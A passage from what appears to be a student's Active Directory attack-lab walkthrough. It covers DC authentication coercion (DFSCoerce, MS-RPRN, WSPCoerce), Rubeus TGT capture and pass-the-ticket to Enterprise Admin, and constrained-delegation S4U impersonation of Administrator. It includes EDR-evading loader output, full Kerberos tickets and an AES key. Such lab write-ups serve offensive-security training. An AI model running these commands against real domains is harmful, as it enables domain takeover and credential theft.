* C:\Users\student731>C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```
[*] Attempting to coerce auth on ncacn_np:dcorp-dc[\PIPE\netdfs] and receive connection on: dcorp-appsrv
[+] DfsCoerce seems successful, check listener running on:dcorp-appsrv
```

### Escalation to Enterprise Admins
To get Enterprise Admin privileges, we need to force authentication from mcorp-dc. Run the below command to listern for mcorp-dc$ tickets on dcorp-appsrv.

* C:\Windows\system32> winrs -r:dcorp-appsrv cmd
* C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : http://127.0.0.1:8080/Rubeus.exe Arguments : monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
[*] Action: TGT Monitoring
[*] Target user     : MCORP-DC$
[*] Monitoring every 5 seconds for new TGTs
```

### Use MS-RPRN on the student VM to trigger authentication from mcorp-dc to dcorp-appsrv
* C:\Users\student731> C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

Alternatively, we can also use MS-DFSNM or MS-WSP (note that we are not using FQDN of mcorp-dc in 
case of WSPCoerce).

* C:\Users\student731> C:\AD\Tools\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local
```
[*] Attempting to coerce auth on ncacn_np:mcorp-dc.moneycorp.local[\PIPE\netdfs] and receive connection on: dcorp-appsrv.dollarcorp.moneycorp.local
[+] DfsCoerce seems successful, check listener running on:dcorp-appsrv.dollarcorp.moneycorp.local
```

* C:\Users\student731> C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args mcorp-dc dcorp-appsrv.dollarcorp.moneycorp.local
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\WSPCoerce.exe Arguments : mcorp-dc dcorp-appsrv.dollarcorp.moneycorp.local
[+] OleDbException - Error 0x80040718L
[+] Search query successfully sent to the target
```

### On the Rubeus listener, we can see the TGT of mcorp-dc$
```
[*] 9/28/2025 5:30:32 PM UTC - Found new TGT:

  User                  :  MCORP-DC$@MONEYCORP.LOCAL
  StartTime             :  9/28/2025 5:06:12 AM
  EndTime               :  9/28/2025 3:05:35 PM
  RenewTill             :  10/5/2025 5:05:35 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```

As previously, copy the base64 encoded ticket and use it with Rubeus on student VM. 
Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process.

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIF1jCCBdKgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADA...

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : ptt /ticket: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

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

### We escalated to Enterprise Admins too!

### Learning Objective 16:
```
• Enumerate users in the domain for whom Constrained Delegation is enabled. 
  − For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured. 
  − Pass the ticket and access the service as DA. 
• Enumerate computer accounts in the domain for which Constrained Delegation is enabled. 
  − For such a user, request a TGT from the DC.
  − Obtain an alternate TGS for LDAP service on the target machine. 
  − Use the TGS for executing DCSync attack.
```

### To enumerate users with constrained delegation we can use PowerView. 
### Run the below command from a PowerShell session started using Invisi-Shell

* PS C:\AD\Tools> . C:\AD\Tools\PowerView.ps1
* PS C:\AD\Tools> Get-DomainUser -TrustedToAuth
```
logoncount               : 5
badpasswordtime          : 12/31/1600 4:00:00 PM
distinguishedname        : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass              : {top, person, organizationalPerson, user}
displayname              : web svc
lastlogontimestamp       : 10/25/2024 3:37:34 AM
userprincipalname        : websvc
whencreated              : 11/14/2022 12:42:13 PM
samaccountname           : websvc
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 10/25/2024 10:37:34 AM
instancetype             : 4
usncreated               : 38071
objectguid               : b7ab147c-f929-4ad2-82c9-7e1b656492fe
sn                       : svc
lastlogoff               : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata    : {12/5/2024 12:47:28 PM, 11/14/2022 12:42:13 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname     : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
givenname                : web
usnchanged               : 255349
lastlogon                : 10/25/2024 3:37:34 AM
badpwdcount              : 0
cn                       : web svc
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
objectsid                : S-1-5-21-719815819-3726368948-3917688648-1114
primarygroupid           : 513
pwdlastset               : 11/14/2022 4:42:13 AM
name                     : web svc
```

We already have secrets of websvc from dcorp-admisrv machine. We can use Rubeus to abuse that. 

### Abuse Constrained Delegation using websvc with Rubeus
In the below command, we request a TGS for websvc as the Domain Administrator - Administrator. 
Then the TGS used to access the service specified in the /msdsspn parameter (which is filesystem on dcorp-mssql)

* C:\Users\student731> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\websvc'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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


[*] Action: S4U

[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      doIGTDCCBkigAwIBBaEDAgEWooIFPjCCBTphggU2MIIFMqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMohMwEaADAgEBoQowCBsGd2Vic3Zjo4IE9jCCBPKgAwIBF6EDAgECooIE5ASCBODsggZ1
      iohUnP3tH84S+JztannQ9uHmoCpMKNuqTPDlXwt8Zi6JF41kYmSYzkiO4MwOu9JEIlBAG2hsLGrC2I8W
      2MNACcPY3CtkWHiQViyWnS/SPcPFgx4CDznxcomgoCViwsDxnoNeL8s9Mfmj0ZUZF+XYGI3djtQsPoI0
      eEiqOEU0asVVOxzGKfMM/bqkHtf8EmWfwXfgKxdNgvS6rRS6XfqzR5j8+vwAP2DiOKEIaOS+CzwUd0Wc
      s+ewEGJvTnoK1FhabybgSBsni2UWpWx04loFZjaYURcH/LqAppz2dddXhhVk+rAcdVrr0QgGotI6AvyD
      3wEaEBTIQ1jncPO+VwDvm85XAuNRJPM7tQypLM/UlEYgPr0yiis24qhRS6NdZaugDfh8W9LSZRSO8meR
      Uc4ExbntaiEOeVwK2oSR4fb6A9xO31XitF3YAqS0hFP5HOy0d9c3p3uXmG0XZYm8H5noBYL30ngn6ym7
      DBGnLCiHWLrzD1qDPUXFssz2wx7mbTPaO/Z/Pu4pq+TuAbBUBeuJXOXZHvwuCsSjfyy3GVPBdyQdFRCB
      4gxrbqz6uj8Qnw+g57RAFxzQ87pmTHHIIGQt4v4CY8pKLTLPteDU8D6AkK9vA0qHL3lva/T1lmpx0Olx
      lthXZPyAmNMFqmG0HkjXwjlnOzSDoZ5djRFbdXFUuQTZcoCL+AlWgi1E/lJ40MrnA/GT3+SYU3C5v/I1
      SLDqPpipPmY8PhwMs894HhBFrXkbJo1ldv+Ov/A3PNOLde9cycJYi2t+7eIIskwTno94uc2sI2QcNJo2
      NtvVdYb/yJoGU7K1FFFPwoL+hhFVhTPZKj2S4WiRbLomXaXD05BtIjtvHYH40OGM3hvueOj5TQ2krQvE
      NOdYCSc01q1IBleIQOFcINPCKbLV47V3lPqOzzyjXzU9W1mRHAtxVfrkc5zILYc4/+jKV2OIC/dMcSyB
      3eCJPjUJ+1H9nzyGAXeBhBtH5g5Z0misyY0twUnC2aXBwBXiEOr2UvQToehzkLlsfMnpHwiq9q2IRulH
      0wSyjf0FDAU6T6yzp4pZaTkbJcW2/CYfni9QpXf88WXrCj8wHmi8SvVfqNi2AVfWzWlH81af9NfzODeP
      Go25ls0S7fPDTzPuEvmMBvCMn5s2N4WgW8CfNY48Foeib3d83u9jsLCZ86ioA0zuXaEyjEseVQQAdSks
      1lWJsBdB6/HBheYxjaOY+1d1KJCXIsZqKq3ttaL2RGMqtOB9fvaDICLYeU+r8OvmA4DSjTN/VQhStBXr
      FoOc6DYL/qALZKxN6qsD4rOWSLiS90xnxE1MD9SFhO4dk7G/hCxtOiMxNKyXDh0NW40FHo4zv6a+LJCq
      WxFHZlUbtcCWEQlkETZl0DGvEduchO4W7LzSpGk3tQtXsdZZ9xhsy0YXfSMxmmtmbxEhCzQDpxhdSAex
      kScYXe2LjelJembkZ7g1Gt8zJe0Sz+sL4trGVz/i5UHEsNt/P1u3utiqHudlD4GMg2yKB2tJ38FD//rF
      FCn59qhgs8fGxbC+Xj/B4wV+c0NBijpWrxKjCE4up7qMC+A+izlh6dO2k+DUldGUyGzbdSjfnriGyaPc
      mWmYuR0dW3RVjvOZoHWHqiOiE7+4Uu72vYvDMIPBB8XHyEVWTKxF7ImszJejgfkwgfagAwIBAKKB7gSB
      632B6DCB5aCB4jCB3zCB3KArMCmgAwIBEqEiBCBVmf0gbKac1TPuL+RNEIGoIXq7fm8X31DJxI1qsWnB
      iaEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3Kj
      BwMFAEChAAClERgPMjAyNTA5MjgxNzU0NTNaphEYDzIwMjUwOTI5MDM1NDUzWqcRGA8yMDI1MTAwNTE3
      NTQ1M1qoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypEzARoAMCAQGhCjAIGwZ3ZWJzdmM=

[*] Impersonating user 'Administrator' to target SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Building S4U2proxy request for service: 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL':

      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
[+] Ticket successfully imported!
```

### Check if the TGS is injected

* C:\Users\student731>klist
```
Current LogonId is 0:0x506b9

Cached Tickets: (1)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 9/28/2025 10:54:54 (local)
        End Time:   9/28/2025 20:54:53 (local)
        Renew Time: 10/5/2025 10:54:53 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

### Try accessing filesystem on dcorp-mssql

* C:\AD\Tools> dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$

```
 Volume in drive \\dcorp-mssql.dollarcorp.moneycorp.local\c$ has no label.
